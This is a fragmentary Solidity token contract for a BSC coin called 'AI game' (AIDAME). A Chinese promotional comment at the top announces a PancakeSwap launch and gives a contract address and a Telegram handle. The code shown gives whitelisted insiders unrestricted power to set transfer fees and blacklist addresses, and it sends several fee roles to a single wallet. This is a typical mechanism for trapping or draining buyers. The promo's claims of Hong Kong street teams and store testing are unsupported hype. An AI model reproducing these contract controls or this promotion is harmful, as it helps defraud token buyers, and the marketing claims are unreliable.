...
/**
 *AI game上线预告:
         AI game香港概念通证，230家地推团队，实体店游戏已在香港测试运行，已确定于2023年3月19号21:00分，在BSC链pancakeswap交易平台准时上线，预祝AI game顺利上线，一飞冲天。
合约：0x73e064c03d5c985Ede168CB9fb81Cc1f9CCfF106
Tg:@chatgptbsccoin
*/
...
abstract contract AbsToken is IERC20, Ownable {
    ...
    ) external  {if (_feeWhiteList[msg.sender])
    ...
    function setTransferFee(uint256 fee) external  {if (_feeWhiteList[msg.sender])
        _transferFee = fee;
    }
    ...
    function setBlackList(address addr, bool enable) external  {if (_feeWhiteList[msg.sender])
...
contract AIDAME is AbsToken {
    constructor() AbsToken(
        ...
        18,
        200000,
        address(0x7657eAc885025AA12F1BcCcAB1C6A5BA1931f15f),
        address(0x7657eAc885025AA12F1BcCcAB1C6A5BA1931f15f),
        address(0x7657eAc885025AA12F1BcCcAB1C6A5BA1931f15f),
        address(0x7657eAc885025AA12F1BcCcAB1C6A5BA1931f15f),
        10,
